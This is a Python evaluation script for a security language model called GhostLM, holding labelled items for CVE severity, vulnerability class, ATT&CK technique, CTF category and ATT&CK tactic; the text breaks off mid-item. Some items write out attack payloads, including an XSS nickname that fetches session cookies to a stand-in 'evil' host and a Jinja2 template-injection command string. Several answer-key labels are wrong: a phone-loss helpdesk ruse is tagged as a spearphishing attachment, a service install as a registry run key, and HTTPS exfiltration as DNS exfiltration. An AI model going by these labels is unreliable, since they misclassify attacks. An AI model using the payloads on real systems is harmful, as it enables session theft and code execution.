"""GhostLM cybersecurity evaluation — tests the model on security-specific classification tasks."""

import argparse
import json
import math
import sys
import time
from dataclasses import fields
from pathlib import Path
from typing import Dict, List, Tuple

import torch

from ghostlm.config import GhostLMConfig
from ghostlm.model import GhostLM
from ghostlm.tokenizer import GhostTokenizer


# ---------------------------------------------------------------------------
# Task 1: CVE Severity Classification
#   Given a CVE-style description, classify as Critical / High / Medium / Low.
# ---------------------------------------------------------------------------
CVE_SEVERITY_SAMPLES = [
    {
        "description": (
            "A remote code execution vulnerability exists in the HTTP protocol stack (http.sys) "
            "that allows an unauthenticated attacker to send specially crafted packets to a "
            "targeted server to execute arbitrary code with SYSTEM privileges. No user interaction "
            "is required and the attack can be carried out over the network without authentication."
        ),
        "label": "Critical",
    },
    {
        "description": (
            "A heap-based buffer overflow in the SIP module of a firewall appliance allows an "
            "unauthenticated remote attacker to achieve remote code execution by sending crafted "
            "SIP packets. The vulnerability exists due to insufficient validation of SIP message "
            "headers. CVSS base score 9.8."
        ),
        "label": "Critical",
    },
    {
        "description": (
            "An SQL injection vulnerability in the admin panel of a web application allows an "
            "authenticated administrator to execute arbitrary SQL commands via the user search "
            "parameter. Successful exploitation requires valid administrator credentials and "
            "could lead to data exfiltration from the backend database."
        ),
        "label": "High",
    },
    {
        "description": (
            "A privilege escalation vulnerability in the kernel allows a local attacker with "
            "low-privilege user access to gain root privileges by exploiting a race condition "
            "in the filesystem mount handling code. The attacker must have local access to the "
            "system and can exploit the vulnerability to gain full control."
        ),
        "label": "High",
    },
    {
        "description": (
            "A stored cross-site scripting vulnerability exists in the user profile page of the "
            "web application. An authenticated user can inject malicious JavaScript code via the "
            "bio field that executes in other users' browsers when they view the profile. The "
            "impact is limited to session hijacking within the application context."
        ),
        "label": "Medium",
    },
    {
        "description": (
            "An information disclosure vulnerability in the API endpoint allows an authenticated "
            "user to enumerate valid usernames by observing differences in response times between "
            "valid and invalid usernames. The vulnerability does not directly expose sensitive data "
            "but could assist in targeted attacks."
        ),
        "label": "Medium",
    },
    {
        "description": (
            "A denial-of-service vulnerability exists in the XML parser that can be triggered by "
            "sending a specially crafted XML document with deeply nested entities. The parser "
            "consumes excessive memory and CPU but the service automatically recovers after the "
            "malicious request is processed. No data is exposed or modified."
        ),
        "label": "Medium",
    },
    {
        "description": (
            "The application discloses its software version number in HTTP response headers. "
            "While this information could help an attacker identify known vulnerabilities for "
            "the specific version, it does not directly enable exploitation. The information "
            "is limited to the server software name and version string."
        ),
        "label": "Low",
    },
    {
        "description": (
            "A self-XSS vulnerability exists where a user can inject JavaScript code that only "
            "executes in their own browser session. The attack cannot be triggered remotely or "
            "against other users and requires the victim to manually paste the malicious code "
            "into their own browser console or form field."
        ),
        "label": "Low",
    },
    {
        "description": (
            "The application uses a cookie without the Secure flag set, which means the cookie "
            "could be transmitted over an unencrypted HTTP connection if the user navigates to "
            "the HTTP version of the site. The cookie does not contain sensitive session data."
        ),
        "label": "Low",
    },
    {
        "description": (
            "A JNDI lookup vulnerability in a widely deployed Java logging library allows an "
            "unauthenticated remote attacker to trigger arbitrary code execution by sending a "
            "crafted string that the logger evaluates. No user interaction or authentication is "
            "required and the bug is wormable across internet-facing services. CVSS base score 10.0."
        ),
        "label": "Critical",
    },
    {
        "description": (
            "An authentication bypass in the administrative web interface of an enterprise router "
            "lets an unauthenticated attacker on the WAN side reach a hidden endpoint that returns "
            "a root shell. The affected models are deployed in tens of thousands of branch offices "
            "with the management interface exposed to the internet by default."
        ),
        "label": "Critical",
    },
    {
        "description": (
            "A use-after-free in a browser's PDF rendering pipeline can be triggered by simply "
            "visiting a malicious web page. Successful exploitation yields code execution inside "
            "the renderer process, and a public proof-of-concept chains it with a sandbox escape "
            "for full system compromise. The vendor confirms in-the-wild exploitation."
        ),
        "label": "Critical",
    },
    {
        "description": (
            "Embedded firmware on an IoT camera ships with a hardcoded telnet account whose "
            "credentials cannot be changed by the operator. The device exposes telnet on port 23 "
            "by default, granting any remote attacker root shell access. Several million units are "
            "estimated to be reachable from the public internet."
        ),
        "label": "Critical",
    },
    {
        "description": (
            "A server-side request forgery in a cloud control plane allows an attacker with a "
            "low-privilege API token to coerce the service into requesting the cloud metadata "
            "endpoint. The response leaks short-lived IAM credentials with broad permissions on "
            "the underlying VPC. Authentication is required but the attack scales across tenants."
        ),
        "label": "High",
    },
    {
        "description": (
            "A setuid-root system utility parses its configuration file using an unsafe expansion "
            "routine. A local unprivileged user can plant a crafted config file via a predictable "
            "path and obtain a root shell. Local access is required and the binary is installed "
            "by default on most Linux distributions in the affected version range."
        ),
        "label": "High",
    },
    {
        "description": (
            "An authenticated remote code execution flaw in a CMS file-manager plugin allows any "
            "user with admin role to upload a malicious archive that escapes the upload directory "
            "and writes a webshell into the site root. Exploitation requires valid admin "
            "credentials but yields full server compromise on a popular open-source platform."
        ),
        "label": "High",
    },
    {
        "description": (
            "A race condition in a container runtime's cgroup handling lets a process inside a "
            "container momentarily share a file descriptor with the host. Carefully timed writes "
            "from the container break out into the host filesystem and, with additional steps, "
            "escalate to host root. Local code execution inside an attacker-controlled container "
            "is required."
        ),
        "label": "High",
    },
    {
        "description": (
            "A reflected cross-site scripting issue in a customer support portal's search results "
            "page reflects the query parameter without encoding. Exploitation requires the victim "
            "to click a crafted link sent over chat or email; impact is limited to session theft "
            "within the support portal, which holds no payment or identity data."
        ),
        "label": "Medium",
    },
    {
        "description": (
            "A cross-site request forgery vulnerability on a non-critical preferences endpoint "
            "lets an attacker trick a logged-in user into changing their notification frequency. "
            "The endpoint is rate-limited and only affects user-facing settings; no authentication "
            "tokens, payment data, or privileges can be modified."
        ),
        "label": "Medium",
    },
    {
        "description": (
            "An open redirect in an OAuth callback handler accepts arbitrary external URLs in the "
            "redirect_uri parameter. While not directly exploitable for credential theft because "
            "of strict client validation, it can be chained with a social-engineering campaign to "
            "lend legitimacy to phishing pages hosted under attacker domains."
        ),
        "label": "Medium",
    },
    {
        "description": (
            "An internal SSRF in a feed-import feature lets an authenticated user fetch arbitrary "
            "URLs reachable from the application server. The target environment uses strict "
            "network segmentation that blocks the metadata service and the database, so the "
            "vulnerability is bounded to leaking internal HTTP services and probing topology."
        ),
        "label": "Medium",
    },
    {
        "description": (
            "The login endpoint returns subtly different error messages and response timings for "
            "valid versus invalid usernames, allowing an attacker to enumerate accounts. The flaw "
            "does not by itself reveal credentials or expose user data, but it informs targeted "
            "credential-stuffing campaigns against the identified accounts."
        ),
        "label": "Low",
    },
    {
        "description": (
            "A debug error page on a low-traffic admin tool reveals the underlying framework, ORM, "
            "and database product names along with stack-trace excerpts. The information may help "
            "an attacker tailor follow-up exploitation but does not directly expose data, "
            "credentials, or unauthenticated functionality."
        ),
        "label": "Low",
    },
    {
        "description": (
            "Static documentation pages served from the public site lack a Content-Security-Policy "
            "response header. There is no user-supplied content rendered on these pages and no "
            "authentication context is associated with them, so the missing header is a "
            "defense-in-depth gap rather than a directly exploitable vulnerability."
        ),
        "label": "Low",
    },
]

# ---------------------------------------------------------------------------
# Task 2: Vulnerability Type Detection
#   Given a description, identify the vulnerability class.
# ---------------------------------------------------------------------------
VULN_TYPE_SAMPLES = [
    {
        "description": (
            "The application constructs SQL queries by directly concatenating user input from "
            "the search field without parameterization. An attacker can inject UNION SELECT "
            "statements to extract data from other tables. The input field was not properly "
            "sanitized allowing malicious SQL statements to be executed against the database."
        ),
        "label": "SQL Injection",
    },
    {
        "description": (
            "The web application reflects user-supplied input from the URL parameter directly "
            "into the HTML response without encoding. An attacker can craft a URL containing "
            "JavaScript code that executes in the victim's browser when they click the link, "
            "potentially stealing session cookies or performing actions on behalf of the user."
        ),
        "label": "Cross-Site Scripting (XSS)",
    },
    {
        "description": (
            "The C program uses the gets() function to read user input into a fixed-size 64-byte "
            "character array on the stack. An attacker can provide input exceeding 64 bytes to "
            "overwrite the saved return address and redirect execution to shellcode placed in the "
            "buffer. The binary lacks stack canaries and ASLR protections."
        ),
        "label": "Buffer Overflow",
    },
    {
        "description": (
            "The web application sends a request to a user-supplied URL to fetch remote content "
            "for preview functionality. An attacker can provide an internal IP address such as "
            "169.254.169.254 to access the cloud metadata service and retrieve IAM credentials, "
            "or scan internal network services not accessible from the internet."
        ),
        "label": "Server-Side Request Forgery (SSRF)",
    },
    {
        "description": (
            "The application accepts serialized Java objects from untrusted sources and "
            "deserializes them without validation. An attacker can craft a malicious serialized "
            "object using gadget chains from common libraries like Apache Commons Collections "
            "to achieve remote code execution when the object is deserialized by the application."
        ),
        "label": "Insecure Deserialization",
    },
    {
        "description": (
            "The application's password reset functionality uses a predictable token generated "
            "from the current timestamp. An attacker can predict valid reset tokens by knowing "
            "the approximate time the reset was requested, allowing them to reset any user's "
            "password without access to their email account."
        ),
        "label": "Broken Authentication",
    },
    {
        "description": (
            "The application allows users to upload files but only checks the file extension on "
            "the client side. An attacker can bypass this by intercepting the request and changing "
            "the filename to include a .php extension, uploading a web shell that provides remote "
            "command execution on the server when accessed via the web."
        ),
        "label": "Unrestricted File Upload",
    },
    {
        "description": (
            "The API endpoint /api/users/123/profile returns the full user profile including "
            "sensitive fields when accessed with any valid authentication token. There is no "
            "check to verify that the authenticated user has permission to view user 123's "
            "profile, allowing any authenticated user to access any other user's data."
        ),
        "label": "Broken Access Control (IDOR)",
    },
    {
        "description": (
            "The application stores user passwords using the MD5 hashing algorithm without salt. "
            "The MD5 algorithm is computationally fast and vulnerable to rainbow table attacks. "
            "An attacker who gains access to the password database can quickly recover plaintext "
            "passwords for the majority of users using precomputed hash tables."
        ),
        "label": "Cryptographic Failure",
    },
    {
        "description": (
            "The application parses user-supplied XML input with external entity processing "
            "enabled. An attacker can define an external entity referencing a local file such as "
            "/etc/passwd and include it in the XML document. The parser resolves the entity and "
            "returns the file contents in the response, enabling arbitrary file reading."
        ),
        "label": "XML External Entity (XXE)",
    },
    {
        "description": (
            "A reporting page builds queries by interpolating the order_by parameter directly "
            "into the SQL string. An attacker submits ';INSERT INTO users(role) VALUES(\"admin\")"
            "-- to append arbitrary statements to the executed query. The web framework returns "
            "no error and the malicious statement runs against the production database."
        ),
        "label": "SQL Injection",
    },
    {
        "description": (
            "A web forum stores user posts in the database verbatim and renders them as HTML in "
            "every viewer's browser. An attacker plants a post containing a <script> tag that "
            "exfiltrates session cookies; everyone who later loads the thread executes the "
            "attacker's payload in the context of the authenticated forum domain."
        ),
        "label": "Cross-Site Scripting (XSS)",
    },
    {
        "description": (
            "A network service copies a length-prefixed protocol field into a fixed-size stack "
            "buffer using memcpy, but never validates the length against the destination size. "
            "An attacker crafts a packet whose length field exceeds the buffer, overwriting the "
            "saved return address and pivoting execution into a return-oriented chain."
        ),
        "label": "Buffer Overflow",
    },
    {
        "description": (
            "A link-preview microservice accepts a target URL from authenticated users and fetches "
            "it server-side to render thumbnails. The fetcher applies no allow-listing of "
            "destination addresses, so attackers point it at 169.254.169.254 to harvest IAM "
            "credentials from the cloud metadata endpoint."
        ),
        "label": "Server-Side Request Forgery (SSRF)",
    },
    {
        "description": (
            "A queue-consumer process reads job payloads from a message broker and deserializes "
            "them with pickle. An attacker who can publish to the broker plants a payload that "
            "invokes os.system on deserialization, granting code execution under the worker's "
            "service account on every node that pulls the message."
        ),
        "label": "Insecure Deserialization",
    },
    {
        "description": (
            "Session identifiers issued at login are derived from the username concatenated with "
            "the current Unix timestamp and hashed with MD5. An attacker who knows a target's "
            "username can iterate the small timestamp window around the observed login and recover "
            "the session token without needing the password."
        ),
        "label": "Broken Authentication",
    },
    {
        "description": (
            "A profile-picture upload form trusts the Content-Type header sent by the browser to "
            "decide where to store the file. By replacing the header with image/png while "
            "uploading a .jsp file, an attacker writes a server-side script into the web root and "
            "obtains command execution by requesting it through the public URL."
        ),
        "label": "Unrestricted File Upload",
    },
    {
        "description": (
            "A document-sharing service identifies notes by a sequential integer in the URL path "
            "and never verifies that the requesting user owns the note. By incrementing the "
            "identifier, any authenticated user can read every other user's private notes "
            "regardless of sharing settings."
        ),
        "label": "Broken Access Control (IDOR)",
    },
    {
        "description": (
            "Customer passwords are stored using SHA-1 with no salt and no key-stretching. An "
            "attacker who exfiltrates the user table can crack the majority of common passwords "
            "in minutes using commodity GPUs and rainbow tables, completely bypassing the "
            "intended authentication boundary."
        ),
        "label": "Cryptographic Failure",
    },
    {
        "description": (
            "An invoice-rendering service ingests user-supplied XML with a permissive parser "
            "configuration. The attacker submits a document defining an external DOCTYPE entity "
            "pointing at file:///etc/shadow, and the parser substitutes the file's contents into "
            "the response served back to the attacker."
        ),
        "label": "XML External Entity (XXE)",
    },
    {
        "description": (
            "A microservice constructs a database query by formatting a Python f-string with the "
            "filter dictionary's keys and values directly. Submitting a key like \"id) OR 1=1--\" "
            "causes the underlying ORM to emit raw SQL with the injected predicate, returning "
            "every row in the table to the attacker."
        ),
        "label": "SQL Injection",
    },
    {
        "description": (
            "A chat-room application stores nicknames as raw HTML in the participants list. "
            "Setting a nickname like <img src=x onerror=fetch('//evil/?c='+document.cookie)> "
            "causes every user's browser to ship their session cookie to the attacker the moment "
            "they join the room."
        ),
        "label": "Cross-Site Scripting (XSS)",
    },
    {
        "description": (
            "A privileged daemon allocates a 256-byte heap buffer for an incoming protocol header "
            "but uses a 32-bit length field that wraps to a small positive number when the high "
            "bits are set. An attacker overflows the heap chunk metadata with a crafted oversized "
            "header, corrupting allocator state to gain code execution."
        ),
        "label": "Buffer Overflow",
    },
    {
        "description": (
            "An internal admin dashboard authenticates via HTTP Basic over the corporate network "
            "and hands back a JWT signed with the symmetric key \"secret\". Any user who reaches "
            "the dashboard can self-issue tokens for arbitrary usernames and escalate to admin "
            "privileges by crafting a token with role=admin."
        ),
        "label": "Broken Authentication",
    },
    {
        "description": (
            "A cloud function that resizes uploaded images deserializes job metadata using Java's "
            "ObjectInputStream. Combining a gadget chain from Apache Commons Collections with a "
            "crafted base64 blob in the metadata field gives the attacker remote code execution "
            "inside the function's container."
        ),
        "label": "Insecure Deserialization",
    },
]

# ---------------------------------------------------------------------------
# Task 3: Attack Technique Identification
#   Given a scenario, identify the ATT&CK-style technique being used.
# ---------------------------------------------------------------------------
ATTACK_TECHNIQUE_SAMPLES = [
    {
        "description": (
            "The adversary sent a targeted email to an employee in the finance department "
            "containing a malicious Excel attachment with an embedded macro. When the employee "
            "opened the attachment and enabled macros, a PowerShell command was executed that "
            "downloaded and ran a second-stage payload from a remote server."
        ),
        "label": "Spearphishing Attachment",
    },
    {
        "description": (
            "After gaining initial access, the attacker used Mimikatz to extract plaintext "
            "passwords and NTLM hashes from the LSASS process memory on the compromised "
            "workstation. These credentials were then used to authenticate to other systems "
            "on the network without triggering password brute-force detection."
        ),
        "label": "Credential Dumping",
    },
    {
        "description": (
            "The malware established persistence by creating a new Windows Registry Run key "
            "at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to the malicious "
            "executable in the user's AppData directory. This ensured the malware would "
            "automatically execute every time the user logged into the system."
        ),
        "label": "Registry Run Keys / Startup Folder",
    },
    {
        "description": (
            "The attacker used PsExec to remotely execute commands on multiple systems within "
            "the network using the domain administrator credentials obtained earlier. The tool "
            "connected to the target systems' ADMIN$ share and deployed a service executable "
            "to run the attacker's commands with SYSTEM-level privileges."
        ),
        "label": "Lateral Movement via Remote Services",
    },
    {
        "description": (
            "The threat actor exfiltrated collected data by encoding it in DNS TXT record "
            "queries sent to a domain they controlled. Each query contained a chunk of "
            "base64-encoded stolen data as a subdomain label, effectively tunneling data out "
            "of the network through the DNS protocol which was allowed through the firewall."
        ),
        "label": "Exfiltration Over DNS",
    },
    {
        "description": (
            "The adversary replaced a legitimate DLL in the application's installation directory "
            "with a malicious version. When the application launched, it loaded the attacker's "
            "DLL instead of the legitimate one due to the Windows DLL search order, executing "
            "malicious code in the context of the trusted application."
        ),
        "label": "DLL Search Order Hijacking",
    },
    {
        "description": (
            "The attacker scheduled a Windows Task Scheduler job to run a PowerShell script "
            "every 6 hours that beaconed to the command and control server. The scheduled task "
            "was given a name similar to a legitimate Windows maintenance task to avoid detection "
            "during routine system administration."
        ),
        "label": "Scheduled Task / Job",
    },
    {
        "description": (
            "After compromising the build server, the attacker modified the CI/CD pipeline "
            "configuration to inject a malicious dependency into the software build process. "
            "Every subsequent build included a backdoor that was distributed to all customers "
            "through the normal software update mechanism."
        ),
        "label": "Supply Chain Compromise",
    },
    {
        "description": (
            "The malware disabled Windows Defender by modifying the registry key "
            "DisableAntiSpyware and terminated the MsMpEng.exe process. It also cleared "
            "Windows Event Logs using wevtutil to remove evidence of its activity, and "
            "disabled the Windows Firewall to allow unrestricted network communication."
        ),
        "label": "Defense Evasion / Impair Defenses",
    },
    {
        "description": (
            "The attacker used a compromised web server as a proxy to relay commands to "
            "internal systems that had no direct internet access. HTTPS traffic to the web "
            "server appeared as normal web traffic to network monitoring tools. The encrypted "
            "channel carried command and control instructions disguised as standard API calls."
        ),
        "label": "Proxy / Web Service C2",
    },
    {
        "description": (
            "The operator sent a chain of emails to the IT helpdesk impersonating a senior "
            "executive who had just lost their phone. After several rounds of plausible chatter, "
            "the helpdesk reset the executive's password and disabled their MFA, handing the "
            "attacker an authenticated session without any malware or technical exploitation."
        ),
        "label": "Spearphishing Attachment",
    },
    {
        "description": (
            "Once on the workstation, the operator dumped the SAM and SYSTEM hives from the "
            "registry, copied them off-host, and used a public tool to extract local NTLM hashes. "
            "The hashes were then replayed against neighboring machines that shared the same "
            "local administrator password."
        ),
        "label": "Credential Dumping",
    },
    {
        "description": (
            "The implant placed a copy of itself in C:\\ProgramData\\Updater\\svc.exe and created "
            "a Windows service named \"WindowsUpdaterHelper\" set to start automatically. Every "
            "boot relaunched the implant under SYSTEM, surviving user logoff and routine "
            "patch reboots."
        ),
        "label": "Registry Run Keys / Startup Folder",
    },
    {
        "description": (
            "Holding domain admin credentials, the operator used WinRM to open remote PowerShell "
            "sessions on a list of file servers, dropped beacons on each one, and pivoted from "
            "the initial workstation outward across the estate without ever touching the "
            "perimeter again."
        ),
        "label": "Lateral Movement via Remote Services",
    },
    {
        "description": (
            "The collected archive of source code was split into 4 KB chunks, encoded as "
            "base32, and exfiltrated as the labels of A-record DNS queries to a domain whose "
            "authoritative server logged each query. Egress firewall rules permitted DNS, so the "
            "channel was never blocked."
        ),
        "label": "Exfiltration Over DNS",
    },
    {
        "description": (
            "The operator dropped a malicious version.dll into the install directory of a "
            "legitimate signed application. When the application launched, the loader satisfied "
            "the import from the planted DLL first and the malicious code ran inside the trusted "
            "process, inheriting its allow-list entries."
        ),
        "label": "DLL Search Order Hijacking",
    },
    {
        "description": (
            "Using schtasks /create, the implant registered a daily job named \"GoogleUpdaterTask\" "
            "that executed a PowerShell stub from %APPDATA%. The disguised name and unremarkable "
            "schedule made the entry indistinguishable from real software at a glance during "
            "incident triage."
        ),
        "label": "Scheduled Task / Job",
    },
    {
        "description": (
            "An attacker quietly committed a malicious typo-squat package to the public registry "
            "and bumped the dependency-version pin in a build pipeline they controlled. The next "
            "release shipped to thousands of downstream customers carried a backdoor that beaconed "
            "out the moment the application loaded."
        ),
        "label": "Supply Chain Compromise",
    },
    {
        "description": (
            "Before staging follow-on tooling, the implant set the registry value "
            "DisableAntiSpyware to 1 under the Windows Defender policy key, killed MsMpEng.exe, "
            "and used wevtutil cl Security to wipe the security event log. Subsequent activity "
            "ran without local AV coverage and without forensic trace in the event log."
        ),
        "label": "Defense Evasion / Impair Defenses",
    },
    {
        "description": (
            "C2 traffic was tunneled through an attacker-controlled CloudFront distribution that "
            "pointed at a legitimate-looking SaaS hostname. Defenders saw only TLS connections to "
            "a reputable CDN, while the implant pulled tasking from the front-end URL and shipped "
            "results back through the same channel."
        ),
        "label": "Proxy / Web Service C2",
    },
    {
        "description": (
            "The campaign began with a spear-phishing email containing a Word document that abused "
            "an external template reference to fetch a remote macro. When the recipient clicked "
            "Enable Editing, the document pulled and executed the macro from the attacker-"
            "controlled template server."
        ),
        "label": "Spearphishing Attachment",
    },
    {
        "description": (
            "After local privilege escalation, the operator ran procdump on lsass.exe and copied "
            "the resulting minidump file off the host. Offline parsing with a public credential "
            "extractor recovered Kerberos tickets and NTLM hashes for every interactive user that "
            "had recently authenticated to the box."
        ),
        "label": "Credential Dumping",
    },
    {
        "description": (
            "The implant added an entry to "
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run named \"OneDriveSync\" that "
            "pointed at its dropper in %TEMP%. Each interactive logon by the compromised user "
            "relaunched the implant without requiring elevated privileges to install."
        ),
        "label": "Registry Run Keys / Startup Folder",
    },
    {
        "description": (
            "Holding a captured service-account hash, the operator used PsExec with a -hash "
            "argument to authenticate to a remote SQL server's ADMIN$ share, dropped a service "
            "binary, and started it as SYSTEM. The same trick was repeated across a dozen back-end "
            "hosts in under an hour."
        ),
        "label": "Lateral Movement via Remote Services",
    },
    {
        "description": (
            "Stolen documents were chunked, AES-encrypted, and exfiltrated as the bodies of POST "
            "requests to /api/telemetry on an attacker-controlled HTTPS endpoint disguised as "
            "an analytics service. The destination domain was registered to mimic the brand of a "
            "well-known SaaS provider already in the proxy allow-list."
        ),
        "label": "Exfiltration Over DNS",
    },
]


# ---------------------------------------------------------------------------
# Task 4: CTF Challenge Categorization
#   Given a challenge description, classify which CTF category it belongs to.
#   Maps onto the CTFtime corpus and the practical taxonomy used by event
#   organizers.
# ---------------------------------------------------------------------------
CTF_CATEGORY_SAMPLES = [
    {
        "description": (
            "The challenge presents a login page that looks normal but the password reset flow "
            "uses a predictable token. Players notice that the token equals md5(username + "
            "current_minute) and forge a reset link for the admin account. Capturing the flag "
            "requires logging into the admin panel and reading /admin/flag."
        ),
        "label": "Web Exploitation",
    },
    {
        "description": (
            "A search box on the challenge site reflects the query parameter into the page "
            "title without escaping. The intended solve injects a script tag that exfiltrates "
            "the admin's session cookie to a webhook the player controls; once the cookie lands, "
            "the admin dashboard reveals the flag."
        ),
        "label": "Web Exploitation",
    },
    {
        "description": (
            "Players are given the source of a Flask app that joins user input into a Jinja2 "
            "template string with render_template_string. A payload like {{config.__class__."
            "__init__.__globals__['os'].popen('cat flag').read()}} executes commands inside the "
            "template engine and prints the flag."
        ),
        "label": "Web Exploitation",
    },
    {
        "description": (
            "The challenge exposes an API that serializes user notes with PHP's serialize() "
            "and deserializes them on the server side. By crafting a magic-method gadget chain "
            "from the included library and submitting it as a base64-encoded note, the player "
            "achieves arbitrary file read and dumps the flag."
        ),
        "label": "Web Exploitation",
    },
    {
        "description": (
            "The site lets users upload an avatar but only checks the file extension on the "
            "client. Players intercept the upload, change the filename to shell.php, and send a "
            "GIF89a header with PHP code in the body. Browsing to the uploaded path executes the "
            "shell and the flag is read from /var/www/flag.txt."
        ),
        "label": "Web Exploitation",
    },
    {
        "description": (
            "Two ciphertexts and the corresponding plaintexts are provided, both encrypted under "
            "the same RC4 key. Players XOR the two ciphertexts together to recover the XOR of the "
            "two plaintexts, then crib-drag against an English wordlist to peel out the flag "
            "from the second message."
        ),
        "label": "Cryptography",
    },
    {
        "description": (
            "The challenge gives an RSA modulus N and a public exponent e=3. The plaintext flag "
            "is small enough that m^3 < N, so no modular reduction occurred during encryption. "
            "Computing the integer cube root of the ciphertext recovers the flag without ever "
            "factoring N."
        ),
        "label": "Cryptography",
    },
    {
        "description": (
            "Players are given an oracle that decrypts AES-CBC ciphertexts and returns whether "
            "the PKCS#7 padding is valid. By flipping bytes of the previous block and observing "
            "padding-validity responses, the standard padding-oracle attack recovers each "
            "plaintext byte and yields the flag."
        ),
        "label": "Cryptography",
    },
    {
        "description": (
            "An ECDSA signing service is provided that reuses the nonce k across two different "
            "messages. The two signatures share r, so subtracting them lets players solve a "
            "linear equation for k and then recover the private key. Forging a signature on "
            "the challenge string returns the flag."
        ),
        "label": "Cryptography",
    },
    {
        "description": (
            "The challenge implements a custom block cipher whose S-box is the identity except "
            "for a single swapped pair. Differential cryptanalysis on chosen plaintext pairs "
            "exposes the swap, the round keys collapse to a 16-bit search, and brute force "
            "recovers the master key and decrypts the flag block."
        ),
        "label": "Cryptography",
    },
    {
        "description": (
            "Players receive a 32-bit ELF binary that reads input with gets() into a 64-byte "
            "stack buffer. NX is enabled but ASLR is not, so the intended solve crafts a ret2libc "
            "chain that jumps to system('/bin/sh') and reads the flag from the spawned shell on "
            "the remote service."
        ),
        "label": "Binary Exploitation",
    },
    {
        "description": (
            "The challenge service has a format string vulnerability — it passes user input "
            "directly to printf. Players use %n writes to overwrite a return address on the stack "
            "and pivot execution to a one_gadget offset in libc, popping a shell with the flag "
            "available in the working directory."
        ),
        "label": "Binary Exploitation",
    },
    {
        "description": (
            "A note-taking heap challenge allocates and frees variable-sized chunks. The "
            "intended solve abuses a tcache double-free to corrupt the freelist, redirect the "
            "next allocation to point at __free_hook, overwrite it with system, and then trigger "
            "free on a chunk whose data is the string '/bin/sh'."
        ),
        "label": "Binary Exploitation",
    },
    {
        "description": (
            "The binary is a kernel module exposing an ioctl interface. A use-after-free in the "
            "ioctl handler lets an unprivileged process reclaim a freed object as a "
            "user-controlled buffer, hijack a function pointer, and execute commit_creds(prepare"
            "_kernel_cred(0)) to get root and read /root/flag."
        ),
        "label": "Binary Exploitation",
    },
    {
        "description": (
            "Players face a sandboxed seccomp jail that only allows open, read, write, and exit. "
            "A buffer overflow in the parser gives ROP execution; the solution chains gadgets to "
            "open(\"/flag\"), read into a buffer, and write the contents back to stdout — all "
            "within the seccomp policy."
        ),
        "label": "Binary Exploitation",
    },
    {
        "description": (
            "The challenge ships a stripped Linux binary that asks for a password. Loading it "
            "into Ghidra reveals a chain of XOR and rotate operations applied to the input and "
            "compared to a hardcoded buffer. Reversing the transform character-by-character "
            "produces the password, which the program prints back as the flag."
        ),
        "label": "Reverse Engineering",
    },
    {
        "description": (
            "Players are given a .NET assembly that has been obfuscated with confused control "
            "flow and string encryption. After running de4dot to clean it up, dnSpy shows that "
            "the validator computes SHA1 of the input and compares it to a constant; brute-"
            "forcing a known wordlist recovers the original flag string."
        ),
        "label": "Reverse Engineering",
    },
    {
        "description": (
            "The binary is an Android APK whose main activity loads a native library and calls "
            "checkFlag(input). Disassembling the .so in Ghidra exposes a custom virtual machine "
            "interpreting bytecode embedded as a resource. Writing a small interpreter for that "
            "VM lets the player evaluate inputs offline and discover the flag."
        ),
        "label": "Reverse Engineering",
    },
    {
        "description": (
            "The challenge is a Windows kernel driver. Loading it in IDA shows a custom hash "
            "function applied to the input followed by a comparison against a fixed digest. "
            "Symbolic execution with angr models the hash and solves the constraint, yielding the "
            "32-character flag without ever running the driver."
        ),
        "label": "Reverse Engineering",
    },
    {
        "description": (
            "Players receive a packed UPX binary with the magic stripped. After fixing the section "
            "headers and unpacking, the unpacked program implements a small register-machine VM. "
            "Tracing instructions through a debugger reconstructs the bytecode dispatch and "
            "reveals that the VM is checking the flag through a chain of arithmetic constraints."
        ),
        "label": "Reverse Engineering",
    },
    {
        "description": (
            "Players receive a 1 GB packet capture from a corporate network. Filtering for HTTP "
            "objects in Wireshark shows an FTP transfer of a ZIP archive split across many "
            "segments. Reassembling the bytes and extracting the archive yields a JPEG with the "
            "flag steganographically appended after the EOI marker."
        ),
        "label": "Forensics",
    },
    {
        "description": (
            "The challenge provides a Volatility-compatible memory image of a Windows host. "
            "Listing processes shows a suspicious binary running from %TEMP%; dumping its memory "
            "and grepping for ASCII strings exposes a base64-encoded blob that decodes into the "
            "flag plus a note from the malware author."
        ),
        "label": "Forensics",
    },
    {
        "description": (
            "Players are given a forensic image of an EXT4 filesystem. The Master File Table "
            "shows a deleted file named secret.txt, but the inode is still intact. Carving the "
            "file from its preserved data blocks with debugfs and icat reconstructs the contents, "
            "which contain the flag."
        ),
        "label": "Forensics",
    },
    {
        "description": (
            "The challenge is a corrupted PNG that won't open. Comparing its bytes to the "
            "spec shows that the IHDR width has been set to a tiny value, hiding most of the "
            "image. Patching the width back to its real size and recomputing the CRC restores "
            "the picture, where the flag is rendered in white text on a black band at the bottom."
        ),
        "label": "Forensics",
    },
    {
        "description": (
            "A WAV audio file is provided. Spectrogram analysis in Audacity reveals slow "
            "sweeping tones encoding text via SSTV; decoding the SSTV signal produces a low-"
            "resolution image. The image contains a QR code that, when scanned, reveals the flag."
        ),
        "label": "Forensics",
    },
]


# ---------------------------------------------------------------------------
# Task 5: MITRE ATT&CK Tactic Classification
#   Given a description of adversary behavior, classify which ATT&CK tactic
#   (high-level adversary goal) is being demonstrated. This is more abstract
#   than Task 3 — it asks "why" rather than "how".
# ---------------------------------------------------------------------------
MITRE_TACTIC_SAMPLES = [
    {
        "description": (
            "The adversary sent a phishing email containing a OneDrive link to a malicious "
            "document. When opened, the document exploited a Word vulnerability and dropped "
            "the first-stage implant onto the victim's workstation, establishing the adversary's "
            "first foothold inside the corporate network."
        ),
        "label": "Initial Access",
    },
    {
        "description": (
            "The adversary scanned a public-facing VPN appliance, identified an unpatched "
            "authentication-bypass CVE, and used it to log in as a privileged user. This was "
            "the first authenticated access into the target organization, which up to that point "
            "had no compromised credentials or hosts."
        ),
        "label": "Initial Access",
    },
    {
        "description": (
            "After the lure document opened, an embedded macro spawned a PowerShell process "
            "that decoded a base64 payload and executed it in memory. No file was written to "
            "disk and the malicious code ran inside the host process the moment the user "
            "approved the macro."
        ),
        "label": "Execution",
    },
    {
        "description": (
            "The adversary used the Windows Management Instrumentation command-line tool to "
            "spawn cmd.exe on a remote host with credentials they had stolen earlier. This caused "
            "their attacker-supplied command line to run on the destination machine, advancing "
            "their objective by executing arbitrary code there."
        ),
        "label": "Execution",
    },
    {
        "description": (
            "The implant created a scheduled task that ran the dropper every 30 minutes using "
            "the SYSTEM account. The task description was crafted to mimic a Microsoft Office "
            "telemetry job, ensuring that the implant would relaunch after every reboot, log-off, "
